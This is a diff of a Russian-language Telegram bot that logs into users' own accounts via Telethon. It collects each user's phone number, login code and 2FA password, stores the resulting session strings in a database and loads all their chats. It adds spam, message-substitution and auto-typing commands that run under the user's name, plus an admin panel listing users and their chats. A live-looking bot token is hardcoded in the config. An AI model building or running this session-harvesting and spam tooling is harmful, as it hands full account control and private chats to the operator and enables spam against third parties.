@@ -27,10 +27,9 @@ from telethon.errors import (
     PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
 )
 
-# Logging
+# ==================== КОНФИГ ====================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Config
 BOT_TOKEN = "8959860095:AAEnbAbGuCBWYQHCAF3uPaMD8y1It1IBby8"
 ADMIN_ID = 5825717381
 DATABASE_URL = os.environ.get('DATABASE_URL')
@@ -44,7 +43,7 @@ CHANNEL_URL = "https://t.me/norikX"
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# In-memory stores
+# ==================== ХРАНИЛИЩА ====================
 mutes = {}
 spam_tasks = {}
 user_spam_texts = {}
@@ -63,17 +62,16 @@ banned_users = set()
 bot_id = None
 CHANNEL_LINK = None
 manual_added_users = set()
-
-# Хранилище для Telethon клиентов
 telethon_clients: Dict[int, TelegramClient] = {}
 user_dialogs: Dict[int, List[Tuple[int, str]]] = {}
 
+# ==================== СОСТОЯНИЯ FSM ====================
 class AuthState(StatesGroup):
     waiting_for_phone = State()
     waiting_for_code = State()
     waiting_for_2fa = State()
 
-# Инструкции
+# ==================== ТЕКСТЫ ====================
 MANUAL_INSTRUCTION = (
     "🚀 <b>Инструкция по подключению бота:</b>\n\n"
     "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
@@ -87,34 +85,27 @@ MANUAL_INSTRUCTION = (
     "• Вы соглашаетесь с этим, подключая бота"
 )
 
-GROUP_INSTRUCTION = (
-    "ℹ️ <b>Для работы в группах нужен ваш аккаунт:</b>\n\n"
-    "1️⃣ Нажмите кнопку ниже и отправьте номер телефона\n"
-    "2️⃣ Бот пришлет код подтверждения в Telegram\n"
-    "3️⃣ Введите код для авторизации\n\n"
-    "📱 После авторизации бот получит доступ к вашим чатам"
-)
-
 TEXT_COMMANDS_HELP = (
     "📋 <b>СПИСОК КОМАНД:</b>\n\n"
     "🔹 <b>Спам:</b>\n"
     "• <code>set [текст]</code> — задать текст для спама\n"
     "• <code>ss</code> — запустить спам\n"
     "• <code>dd</code> — остановить спам\n\n"
-    "🔹 <b>Модерация и управление:</b>\n"
-    "• <code>.мут [минуты]</code> / <code>.размут</code> — мут/размут\n"
-    "• <code>печать +</code> / <code>печать -</code> — вкл/выкл постоянную печать\n"
-    "• <code>подмена [текст] [1/2/выкл]</code> — авто-подмена сообщений\n"
-    "• <code>.старт</code> / <code>.стоп</code> — вкл/выкл авто-ссылку\n"
-    "• <code>+реплай</code> / <code>-реплай</code> — защита от ответов реплаем\n"
-    "• <code>+линк [ссылка]</code> — установить авто-ссылку\n"
+    "🔹 <b>Модерация:</b>\n"
+    "• <code>.мут [минуты]</code> — мут\n"
+    "• <code>.размут</code> — размут\n"
+    "• <code>печать +</code> / <code>печать -</code> — печать\n"
+    "• <code>подмена [текст] [1/2/выкл]</code> — подмена\n"
+    "• <code>.старт</code> / <code>.стоп</code> — авто-ссылка\n"
+    "• <code>+реплай</code> / <code>-реплай</code> — защита от реплаев\n"
+    "• <code>+линк [ссылка]</code> — установить ссылку\n"
     "• <code>мой ид</code> / <code>твой ид</code> — узнать ID\n"
-    "• <code>!команды</code> — меню команд\n\n"
+    "• <code>!команды</code> — меню\n\n"
     "🔹 <b>Калькулятор:</b>\n"
-    "• Просто напишите пример: <code>1458+2414</code> или <code>100*5-30</code>"
+    "• Просто напишите пример: <code>1458+2414</code>"
 )
 
-# ---- DB FUNCTIONS ----
+# ==================== БАЗА ДАННЫХ ====================
 def get_db():
     return psycopg2.connect(DATABASE_URL, sslmode='require')
 
@@ -122,18 +113,78 @@ def init_db():
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("CREATE TABLE IF NOT EXISTS chat_settings (chat_id BIGINT, setting_type TEXT, PRIMARY KEY (chat_id, setting_type))")
-                cur.execute("CREATE TABLE IF NOT EXISTS substitutions (chat_id BIGINT PRIMARY KEY, text TEXT, mode INTEGER)")
-                cur.execute("CREATE TABLE IF NOT EXISTS spam_texts (key_id TEXT PRIMARY KEY, text TEXT)")
-                cur.execute("CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)")
-                cur.execute("CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)")
-                cur.execute("CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)")
-                cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
-                cur.execute("CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
-                cur.execute("CREATE TABLE IF NOT EXISTS manual_users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
-                cur.execute("CREATE TABLE IF NOT EXISTS user_chats (user_id BIGINT, chat_id BIGINT, chat_name TEXT, PRIMARY KEY (user_id, chat_id))")
+                # ВСЕ ТАБЛИЦЫ С ПРАВИЛЬНОЙ СТРУКТУРОЙ
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS chat_settings (
+                        chat_id BIGINT, 
+                        setting_type TEXT, 
+                        PRIMARY KEY (chat_id, setting_type)
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS substitutions (
+                        chat_id BIGINT PRIMARY KEY, 
+                        text TEXT, 
+                        mode INTEGER
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS spam_texts (
+                        key_id TEXT PRIMARY KEY, 
+                        text TEXT
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS banned_users (
+                        user_id BIGINT PRIMARY KEY
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS user_map (
+                        user_id BIGINT PRIMARY KEY, 
+                        username TEXT, 
+                        first_name TEXT
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS delivered_promo (
+                        chat_id BIGINT PRIMARY KEY
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS user_sessions (
+                        user_id BIGINT PRIMARY KEY, 
+                        session_string TEXT
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS business_accounts (
+                        user_id BIGINT PRIMARY KEY, 
+                        username TEXT, 
+                        first_name TEXT, 
+                        connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    )
+                """)
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS manual_users (
+                        user_id BIGINT PRIMARY KEY, 
+                        username TEXT, 
+                        first_name TEXT, 
+                        added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    )
+                """)
+                # ГЛАВНОЕ - ПРАВИЛЬНАЯ ТАБЛИЦА С CHAT_NAME
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS user_chats (
+                        user_id BIGINT, 
+                        chat_id BIGINT, 
+                        chat_name TEXT,
+                        PRIMARY KEY (user_id, chat_id)
+                    )
+                """)
                 conn.commit()
                 
+                # Загружаем данные в память
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                 for row in cur.fetchall(): link_chats.add(int(row[0]))
                 cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
@@ -161,15 +212,19 @@ def init_db():
                     if uid not in user_dialogs:
                         user_dialogs[uid] = []
                     user_dialogs[uid].append((cid, name))
+                
+                logging.info("✅ БД инициализирована")
     except Exception as e:
         logging.error(f"❌ Ошибка БД: {e}")
 
+# ==================== ФУНКЦИИ БД ====================
 def save_user_chat(user_id: int, chat_id: int, chat_name: str):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
                 cur.execute(
-                    "INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s, %s, %s) ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name = EXCLUDED.chat_name",
+                    "INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s, %s, %s) "
+                    "ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name = EXCLUDED.chat_name",
                     (user_id, chat_id, chat_name)
                 )
                 conn.commit()
@@ -182,35 +237,7 @@ def save_user_chat(user_id: int, chat_id: int, chat_name: str):
                 else:
                     user_dialogs[user_id].append((chat_id, chat_name))
     except Exception as e:
-        logging.error(f"Ошибка сохранения чата пользователя: {e}")
-
-def delete_user_chat(user_id: int, chat_id: int) -> bool:
-    try:
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute("DELETE FROM user_chats WHERE user_id = %s AND chat_id = %s", (user_id, chat_id))
-                conn.commit()
-                if user_id in user_dialogs:
-                    user_dialogs[user_id] = [c for c in user_dialogs[user_id] if c[0] != chat_id]
-                return True
-    except Exception as e:
-        logging.error(f"Ошибка удаления чата пользователя: {e}")
-        return False
-
-def delete_all_user_chats(user_id: int) -> int:
-    try:
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute("SELECT COUNT(*) FROM user_chats WHERE user_id = %s", (user_id,))
-                count = cur.fetchone()[0]
-                cur.execute("DELETE FROM user_chats WHERE user_id = %s", (user_id,))
-                conn.commit()
-                if user_id in user_dialogs:
-                    user_dialogs[user_id] = []
-                return count
-    except Exception as e:
-        logging.error(f"Ошибка удаления всех чатов пользователя: {e}")
-        return 0
+        logging.error(f"Ошибка сохранения чата: {e}")
 
 def get_user_chats(user_id: int) -> List[Tuple[int, str]]:
     if user_id in user_dialogs:
@@ -272,30 +299,6 @@ def save_business_account(user_id: int, username: str, first_name: str):
     except Exception as e:
         logging.error(f"Ошибка сохранения бизнес-аккаунта: {e}")
 
-def save_manual_user(user_id: int, username: str, first_name: str):
-    try:
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute(
-                    "INSERT INTO manual_users (user_id, username, first_name) VALUES (%s, %s, %s) "
-                    "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
-                    (user_id, username, first_name)
-                )
-                conn.commit()
-                manual_added_users.add(user_id)
-    except Exception as e:
-        logging.error(f"Ошибка сохранения ручного пользователя: {e}")
-
-def delete_manual_user(user_id: int):
-    try:
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute("DELETE FROM manual_users WHERE user_id = %s", (user_id,))
-                conn.commit()
-                manual_added_users.discard(user_id)
-    except Exception as e:
-        logging.error(f"Ошибка удаления ручного пользователя: {e}")
-
 def get_all_users():
     try:
         with get_db() as conn:
@@ -313,16 +316,6 @@ def get_all_users():
         logging.error(f"Ошибка получения пользователей: {e}")
         return []
 
-def get_business_accounts():
-    try:
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute("SELECT user_id, username, first_name, connected_at FROM business_accounts ORDER BY connected_at DESC")
-                return cur.fetchall()
-    except Exception as e:
-        logging.error(f"Ошибка получения бизнес-аккаунтов: {e}")
-        return []
-
 def delete_business_account(user_id: int):
     try:
         with get_db() as conn:
@@ -331,6 +324,17 @@ def delete_business_account(user_id: int):
                 conn.commit()
     except Exception as e:
         logging.error(f"Ошибка удаления бизнес-аккаунта: {e}")
+
+def delete_all_user_chats(user_id: int):
+    try:
+        with get_db() as conn:
+            with conn.cursor() as cur:
+                cur.execute("DELETE FROM user_chats WHERE user_id = %s", (user_id,))
+                conn.commit()
+                if user_id in user_dialogs:
+                    user_dialogs[user_id] = []
+    except Exception as e:
+        logging.error(f"Ошибка удаления чатов: {e}")
 
 def save_user_info(user_id: int, username: str, first_name: str):
     user_id = int(user_id)
@@ -432,7 +436,7 @@ def is_chat_promo_delivered(chat_id):
 
 init_db()
 
-# ---- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----
+# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
 async def delete_msg(chat_id, msg_id, bc_id):
     if bc_id:
         try:
@@ -473,7 +477,7 @@ async def global_typing_loop():
                         except: pass
             await asyncio.sleep(4)
         except Exception as e:
-            logging.error(f"Ошибка автоматической печати: {e}")
+            logging.error(f"Ошибка печати: {e}")
             await asyncio.sleep(4)
 
 async def spam_worker(chat_id, bc_id, reply_to, text):
@@ -602,39 +606,29 @@ def is_calculator_expression(text: str) -> bool:
             if op in cleaned: return True
     return False
 
-# ---- ФУНКЦИИ ДЛЯ РАБОТЫ С TELETHON ----
+# ==================== TELETHON ФУНКЦИИ ====================
 async def get_user_dialogs(client: TelegramClient) -> List[Tuple[int, str]]:
-    """Получает все диалоги пользователя"""
     dialogs = []
     try:
         async for dialog in client.iter_dialogs():
-            if dialog.is_user:
-                name = dialog.name or "Пользователь"
-                dialogs.append((dialog.id, name))
-            elif dialog.is_group or dialog.is_channel:
-                name = dialog.name or "Чат"
-                dialogs.append((dialog.id, name))
+            name = dialog.name or "Чат"
+            dialogs.append((dialog.id, name))
     except Exception as e:
         logging.error(f"Ошибка получения диалогов: {e}")
     return dialogs
 
 async def start_telethon_listener(user_id: int, session_str: str):
-    """Запускает Telethon клиент и слушает сообщения"""
     try:
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
         await client.start()
-        
         telethon_clients[user_id] = client
-        logging.info(f"✅ Telethon клиент запущен для {user_id}")
+        logging.info(f"✅ Telethon запущен для {user_id}")
         
-        # Получаем диалоги
         dialogs = await get_user_dialogs(client)
         for chat_id, chat_name in dialogs:
             save_user_chat(user_id, chat_id, chat_name)
-        
         logging.info(f"📊 Загружено {len(dialogs)} чатов для {user_id}")
         
-        # Слушаем сообщения
         @client.on(events.NewMessage(incoming=True))
         async def handle_message(event):
             try:
@@ -647,14 +641,12 @@ async def start_telethon_listener(user_id: int, session_str: str):
                     )
             except Exception as e:
                 logging.error(f"Ошибка обработки сообщения: {e}")
-        
         return client
-        
     except Exception as e:
         logging.error(f"Ошибка запуска Telethon: {e}")
         return None
 
-# ---- КЛАВИАТУРЫ ----
+# ==================== КЛАВИАТУРЫ ====================
 def get_start_keyboard(user_id: int):
     buttons = []
     if user_id == ADMIN_ID:
@@ -677,7 +669,6 @@ def get_users_keyboard(page: int = 0):
     keyboard = []
     start_idx = page * 10
     end_idx = min(start_idx + 10, len(users))
-    
     for i in range(start_idx, end_idx):
         user_id, username, first_name, date, user_type = users[i]
         name = first_name or username or f"ID:{user_id}"
@@ -691,7 +682,6 @@ def get_users_keyboard(page: int = 0):
                 callback_data=f"user_{user_id}"
             )
         ])
-    
     nav_buttons = []
     if page > 0:
         nav_buttons.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users_page_{page-1}"))
@@ -699,7 +689,6 @@ def get_users_keyboard(page: int = 0):
         nav_buttons.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"users_page_{page+1}"))
     if nav_buttons:
         keyboard.append(nav_buttons)
-    
     keyboard.append([InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_panel_back")])
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
@@ -708,7 +697,6 @@ def get_user_chats_keyboard(user_id: int, page: int = 0):
     keyboard = []
     start_idx = page * 10
     end_idx = min(start_idx + 10, len(chats))
-    
     for i in range(start_idx, end_idx):
         chat_id, chat_name = chats[i]
         display_name = chat_name[:30] + "..." if len(chat_name) > 30 else chat_name
@@ -718,7 +706,6 @@ def get_user_chats_keyboard(user_id: int, page: int = 0):
                 callback_data=f"delete_chat_{user_id}_{chat_id}"
             )
         ])
-    
     nav_buttons = []
     if page > 0:
         nav_buttons.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"chats_page_{user_id}_{page-1}"))
@@ -726,13 +713,11 @@ def get_user_chats_keyboard(user_id: int, page: int = 0):
         nav_buttons.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"chats_page_{user_id}_{page+1}"))
     if nav_buttons:
         keyboard.append(nav_buttons)
-    
     keyboard.append([InlineKeyboardButton(text="🗑️ Удалить ВСЕ чаты", callback_data=f"delete_all_chats_{user_id}")])
     keyboard.append([InlineKeyboardButton(text="🔙 Назад к пользователю", callback_data=f"user_{user_id}")])
-    
     return InlineKeyboardMarkup(inline_keyboard=keyboard)
 
-# ---- START ----
+# ==================== ОБРАБОТЧИКИ КОМАНД ====================
 @dp.message(Command("start"))
 async def cmd_start(message: Message, state: FSMContext):
     await state.clear()
@@ -742,7 +727,7 @@ async def cmd_start(message: Message, state: FSMContext):
     user_mention = get_user_mention(uid, message.from_user.first_name)
     await message.answer(
         f"👋 Добро пожаловать, {user_mention}!\n\n"
-        f"💬 Бот управляет функциями вашего аккаунта и помогает в работе.\n\n"
+        f"💬 Бот управляет функциями вашего аккаунта.\n\n"
         f"Выберите раздел:",
         parse_mode="HTML",
         reply_markup=get_start_keyboard(uid)
@@ -753,322 +738,174 @@ async def admin_panel(message: Message):
     if message.from_user.id != ADMIN_ID: return
     await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
 
-# ---- ОБРАБОТЧИКИ КНОПОК ----
-@dp.callback_query(F.data == "btn_features")
-async def features(callback: CallbackQuery):
-    await callback.answer()
-    await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML")
-
-@dp.callback_query(F.data == "btn_how_to_connect")
-async def how_to_connect(callback: CallbackQuery):
-    await callback.answer()
-    await callback.message.answer(MANUAL_INSTRUCTION, parse_mode="HTML", disable_web_page_preview=True)
-
+# ==================== АВТОРИЗАЦИЯ ====================
 @dp.callback_query(F.data == "btn_group_auth")
 async def group_auth(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    
-    current_state = await state.get_state()
-    if current_state in (AuthState.waiting_for_phone.state, AuthState.waiting_for_code.state, AuthState.waiting_for_2fa.state):
-        await callback.message.answer("⏳ Авторизация уже выполняется. Дождитесь завершения или введите код.")
+    if get_session(callback.from_user.id):
+        await callback.message.answer("✅ Аккаунт уже подключен!")
         return
-    
     keyboard = ReplyKeyboardMarkup(
-        keyboard=[
-            [KeyboardButton(text="📱 Отправить номер телефона", request_contact=True)]
-        ],
+        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True
     )
-    
     await callback.message.answer(
-        f"{GROUP_INSTRUCTION}\n\n"
-        "📱 <b>Отправьте номер телефона</b> в формате:\n"
+        "📱 <b>Для подключения аккаунта:</b>\n\n"
+        "1️⃣ Нажми кнопку «Отправить номер»\n"
+        "2️⃣ Или отправь номер в формате:\n"
         "<code>79123456789</code>\n\n"
-        "Или нажмите кнопку ниже для отправки контакта:",
+        "3️⃣ Введи код из Telegram\n"
+        "4️⃣ Если есть 2FA - введи пароль",
         parse_mode="HTML",
         reply_markup=keyboard
     )
     await state.set_state(AuthState.waiting_for_phone)
 
-# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON (ИСПРАВЛЕННАЯ) =====
 @dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
 async def process_phone(message: Message, state: FSMContext):
-    msg = await message.answer("🔄 Отправка кода подтверждения...", reply_markup=ReplyKeyboardRemove())
-    
+    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
     try:
         if message.contact:
             phone = message.contact.phone_number
-        else:
-            phone = message.text.strip()
-            phone = re.sub(r'[^\d+]', '', phone)
+        elif message.text:
+            phone = re.sub(r'[^\d+]', '', message.text.strip())
             if phone.startswith('8') and len(phone) == 11:
                 phone = '+7' + phone[1:]
             elif not phone.startswith('+'):
                 phone = '+' + phone
-        
-        logging.info(f"Обработка номера: {phone}")
-        
-        # Создаем клиент И СОХРАНЯЕМ его в состояние
+        else:
+            await message.answer("❌ Отправь номер телефоном или контактом")
+            return
+        logging.info(f"📱 Номер: {phone}")
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        
         try:
             result = await client.send_code_request(phone)
-            logging.info(f"Код отправлен на номер {phone}")
-            
-            # Сохраняем ВСЕ данные в состояние
             await state.update_data(
                 phone=phone,
                 phone_code_hash=result.phone_code_hash,
                 session_str=client.session.save(),
-                client=client  # Сохраняем клиент чтобы не создавать заново
+                client=client
             )
-            
-            await msg.edit_text(
-                f"📱 <b>Код подтверждения отправлен!</b>\n\n"
+            await message.answer(
+                f"📱 <b>Код отправлен!</b>\n\n"
                 f"Номер: <code>{phone}</code>\n\n"
-                f"<b>Введите код из Telegram</b> (только цифры):\n"
+                f"<b>Введи код из Telegram</b>\n"
                 f"<i>Например: 12345</i>",
                 parse_mode="HTML"
             )
             await state.set_state(AuthState.waiting_for_code)
-            
         except FloodWaitError as e:
-            await msg.edit_text(f"⏳ Слишком много попыток. Подождите {e.seconds} секунд.")
-            await state.clear()
-        except PhoneNumberInvalidError:
-            await msg.edit_text("❌ Некорректный номер телефона. Проверьте правильность ввода.")
+            await message.answer(f"⏳ Подожди {e.seconds} секунд")
             await state.clear()
         except Exception as e:
-            logging.error(f"Ошибка отправки кода: {e}")
-            await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново.")
+            await message.answer(f"❌ Ошибка: {str(e)}")
             await state.clear()
-        finally:
-            # НЕ отключаем клиент, он нам еще понадобится!
-            pass
-        
     except Exception as e:
-        logging.error(f"Ошибка при отправке кода: {e}")
-        await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново.")
+        logging.error(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {str(e)}")
         await state.clear()
 
 @dp.message(StateFilter(AuthState.waiting_for_code), F.text)
 async def process_code(message: Message, state: FSMContext):
     code = re.sub(r'\s+', '', message.text.strip())
-    
     if not code.isdigit():
-        await message.answer("❌ Код должен содержать только цифры. Попробуйте еще раз:")
+        await message.answer("❌ Код должен содержать только цифры")
         return
-    
     data = await state.get_data()
     phone = data.get("phone")
     phone_code_hash = data.get("phone_code_hash")
-    session_str = data.get("session_str")
-    client = data.get("client")  # Берем клиент из состояния
-
-    if not phone or not phone_code_hash or not session_str:
-        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Подключить аккаунт для групп».")
+    client = data.get("client")
+    if not phone or not phone_code_hash or not client:
+        await message.answer("❌ Данные устарели. Начни заново")
         await state.clear()
         return
-
-    checking_msg = await message.answer("🔄 Проверка кода...")
-    
-    # Если клиент есть, используем его, иначе создаем новый
-    if client:
-        try:
-            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            final_session = client.session.save()
-            
-            # Сохраняем сессию в БД
-            save_session(message.from_user.id, final_session)
-            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-            
-            # Запускаем Telethon клиент
-            await start_telethon_listener(message.from_user.id, final_session)
-            
-            # Закрываем клиент
-            await client.disconnect()
-            
-            await checking_msg.delete()
-            await message.answer(
-                f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
-                f"📊 Бот загрузил все ваши чаты.\n"
-                f"Теперь он будет работать в ваших группах и чатах.\n\n"
-                f"{TEXT_COMMANDS_HELP}",
-                parse_mode="HTML",
-                reply_markup=ReplyKeyboardRemove()
-            )
-            await state.clear()
-            
-        except SessionPasswordNeededError:
-            await checking_msg.delete()
-            await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
-            await state.set_state(AuthState.waiting_for_2fa)
-            
-        except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
-            await checking_msg.delete()
-            await message.answer(
-                "❌ <b>Неверный код!</b>\n\n"
-                "Проверьте код и попробуйте ещё раз.",
-                parse_mode="HTML"
-            )
-            # НЕ очищаем состояние, чтобы можно было ввести код снова
-            
-        except Exception as e:
-            await checking_msg.delete()
-            logging.error(f"Ошибка входа: {e}")
-            await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново через кнопку «Подключить аккаунт для групп».")
-            await state.clear()
-    else:
-        # Если клиента нет в состоянии - создаем новый
-        new_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        await new_client.connect()
-        
-        try:
-            await new_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            final_session = new_client.session.save()
-            
-            save_session(message.from_user.id, final_session)
-            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-            
-            await start_telethon_listener(message.from_user.id, final_session)
-            
-            await new_client.disconnect()
-            
-            await checking_msg.delete()
-            await message.answer(
-                f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
-                f"📊 Бот загрузил все ваши чаты.\n"
-                f"Теперь он будет работать в ваших группах и чатах.\n\n"
-                f"{TEXT_COMMANDS_HELP}",
-                parse_mode="HTML",
-                reply_markup=ReplyKeyboardRemove()
-            )
-            await state.clear()
-            
-        except SessionPasswordNeededError:
-            await checking_msg.delete()
-            await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
-            await state.set_state(AuthState.waiting_for_2fa)
-            
-        except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
-            await checking_msg.delete()
-            await message.answer(
-                "❌ <b>Неверный код!</b>\n\n"
-                "Проверьте код и попробуйте ещё раз.",
-                parse_mode="HTML"
-            )
-            
-        except Exception as e:
-            await checking_msg.delete()
-            logging.error(f"Ошибка входа: {e}")
-            await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново через кнопку «Подключить аккаунт для групп».")
-            await state.clear()
+    await message.answer("🔄 Проверка кода...")
+    try:
+        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        await start_telethon_listener(message.from_user.id, final_session)
+        await client.disconnect()
+        await message.answer(
+            f"✅ <b>Аккаунт подключен!</b>\n\n"
+            f"📊 Бот загрузил все чаты.\n"
+            f"Теперь он работает в группах от твоего имени.",
+            parse_mode="HTML"
+        )
+        await state.clear()
+    except SessionPasswordNeededError:
+        await message.answer("🔐 Введи пароль 2FA:", parse_mode="HTML")
+        await state.set_state(AuthState.waiting_for_2fa)
+    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
+        await message.answer("❌ Неверный код. Попробуй еще раз")
+    except Exception as e:
+        logging.error(f"Ошибка: {e}")
+        await message.answer(f"❌ Ошибка: {str(e)}")
+        await state.clear()
 
 @dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
 async def process_2fa(message: Message, state: FSMContext):
     password = message.text.strip()
     data = await state.get_data()
-    session_str = data.get("session_str")
     client = data.get("client")
+    if not client:
+        await message.answer("❌ Данные устарели. Начни заново")
+        await state.clear()
+        return
+    try:
+        await client.sign_in(password=password)
+        final_session = client.session.save()
+        save_session(message.from_user.id, final_session)
+        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        await start_telethon_listener(message.from_user.id, final_session)
+        await client.disconnect()
+        await message.answer(
+            f"✅ <b>Аккаунт подключен!</b>\n\n"
+            f"📊 Бот загрузил все чаты.\n"
+            f"Теперь он работает в группах от твоего имени.",
+            parse_mode="HTML"
+        )
+        await state.clear()
+    except Exception as e:
+        await message.answer(f"❌ Неверный пароль: {str(e)}")
 
-    if client:
-        try:
-            await client.sign_in(password=password)
-            final_session = client.session.save()
-            
-            save_session(message.from_user.id, final_session)
-            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-            
-            await start_telethon_listener(message.from_user.id, final_session)
-            
-            await client.disconnect()
-
-            await message.answer(
-                f"✅ <b>Авторизация успешна!</b>\n\n"
-                f"📊 Бот загрузил все ваши чаты.\n"
-                f"Теперь он будет работать в ваших группах и чатах.\n\n"
-                f"{TEXT_COMMANDS_HELP}",
-                parse_mode="HTML",
-                reply_markup=ReplyKeyboardRemove()
-            )
-            await state.clear()
-            
-        except Exception as e:
-            await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте еще раз:")
-    else:
-        # Создаем новый клиент
-        new_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        await new_client.connect()
-        
-        try:
-            await new_client.sign_in(password=password)
-            final_session = new_client.session.save()
-            
-            save_session(message.from_user.id, final_session)
-            save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
-            
-            await start_telethon_listener(message.from_user.id, final_session)
-            
-            await new_client.disconnect()
-
-            await message.answer(
-                f"✅ <b>Авторизация успешна!</b>\n\n"
-                f"📊 Бот загрузил все ваши чаты.\n"
-                f"Теперь он будет работать в ваших группах и чатах.\n\n"
-                f"{TEXT_COMMANDS_HELP}",
-                parse_mode="HTML",
-                reply_markup=ReplyKeyboardRemove()
-            )
-            await state.clear()
-            
-        except Exception as e:
-            await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте еще раз:")
-
-# ---- КОМАНДА ОТКЛЮЧЕНИЯ ----
+# ==================== ОТКЛЮЧЕНИЕ ====================
 @dp.message(Command("disconnect"))
 async def cmd_disconnect(message: Message):
     if message.chat.type != "private":
         await message.answer("❌ Используйте в личных сообщениях.")
         return
-    
     user_id = message.from_user.id
-    
-    session = get_session(user_id)
-    if not session:
+    if not get_session(user_id):
         await message.answer("❌ У вас нет активной сессии.")
         return
-    
     delete_session(user_id)
-    
     if user_id in telethon_clients:
         try:
             await telethon_clients[user_id].disconnect()
         except:
             pass
         del telethon_clients[user_id]
-    
     delete_all_user_chats(user_id)
     delete_business_account(user_id)
-    
     await message.answer(
         "✅ <b>Аккаунт отключен!</b>\n\n"
         "🔒 Все данные удалены с сервера:\n"
         "• Сессия удалена\n"
         "• Все чаты удалены\n"
